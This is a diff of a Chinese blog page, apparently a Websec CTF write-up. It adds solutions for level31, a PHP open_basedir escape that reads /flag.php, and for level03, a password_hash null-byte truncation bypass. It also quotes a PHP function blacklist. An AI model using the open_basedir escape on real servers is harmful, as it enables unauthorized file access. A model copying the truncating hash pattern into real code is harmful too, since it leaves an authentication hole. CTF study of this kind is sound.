@@ -84,7 +84,7 @@
             <h1>Websec 刷题</h1>
             <span class="meta">
             	Posted on
-              2020-04-26，5 min read
+              2020-05-08，6 min read
             </span>
           </div>
         </div>
@@ -282,12 +282,31 @@ $variables = array ('_GET', '_POST', '_COOKIE', '_REQUEST', '_SERVER', '_FILES',
 $blacklist = array_merge($funcs_internal, $funcs_extra, $funny_chars, $variables);
 </code></pre>
 <p>我们输入的东西不能是以上内容。最后会eval执行</p>
+<h1 id="level31">level31</h1>
+<p>就一个open_basedir<br>
+切换到一个存在的目录。然后..出去</p>
+<pre><code>ini_set('open_basedir','/sandbox');chdir('./tmp');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(file_get_contents('/flag.php'));
+</code></pre>
+<p>用scandir知道当前有个tmp目录。然后有flag.php。可以用global协议遍历目录得到</p>
+<h1 id="level03">level03</h1>
+<pre><code>$h2 = password_hash (sha1($_POST['c'], fa1se), PASSWORD_BCRYPT);
+password_verify (sha1($flag, fa1se), $h2
+</code></pre>
+<p>我们输入的值。经过sha1加密。返回一串16进制值。然后进入password_hash加密。得到一串hash。注意password_hash如果遇到00.就会截断。只会加密00前面的字符串</p>
+<p>如果我们生成的hash。等于了flag经过sha1返回的16进制。那么就给出flag</p>
+<p>这里给出payload<br>
+wadaa<br>
+wadaa经过sha1.加密得到7c0022af2ef5ee457ea9a8aba36d1b54b73085e0<br>
+经过password_hash加密。仅仅是7c00。这四个字符的加密结果<br>
+然后flag的sha1.是7c00249d409a91ab84e3f421c193520d9fb3674b<br>
+password_verify。会将第一个参数。经过password_hash加密。然后和我们输入进行比较<br>
+同样都是对7c00进行加密。所以相同</p>
 
           
           <p class="next-post">下一篇：
-            <a href="https://guokeya.github.io/post/d_d-c9pyD/">
+            <a href="https://guokeya.github.io/post/WbMhNdDm1/">
               <span class="post-title">
-                安恒四月月赛 WP&rarr;
+                LFI2019(文件包含。无数字字母webshell)&rarr;
               </span>
             </a>
           </p>
